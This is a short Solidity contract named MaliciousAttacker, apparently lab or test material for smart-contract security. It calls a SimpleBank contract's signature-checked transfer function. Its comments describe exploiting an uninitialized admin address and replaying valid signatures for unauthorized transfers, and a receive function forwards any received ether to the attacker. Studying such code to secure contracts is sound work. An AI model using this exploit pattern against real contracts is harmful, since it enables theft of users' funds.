// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./ecrecover.sol";

contract MaliciousAttacker {
    SimpleBank public simpleBank;
    address public attacker;

    constructor(address _simpleBank) {
        simpleBank = SimpleBank(_simpleBank);
        attacker = msg.sender; // Initialize the attacker's address
    }

    function attack(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        // Exploit the uninitialized admin address vulnerability
        simpleBank.transfer(_to, _amount, _hash, _v, _r, _s);
    }

    function replayAttack(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        // Attempt to replay a valid signature to execute unauthorized transfers
        simpleBank.transfer(_to, _amount, _hash, _v, _r, _s);
    }

    receive() external payable {
        // Drain any ether sent to the contract to attacker address
        payable(attacker).transfer(address(this).balance);
    }
}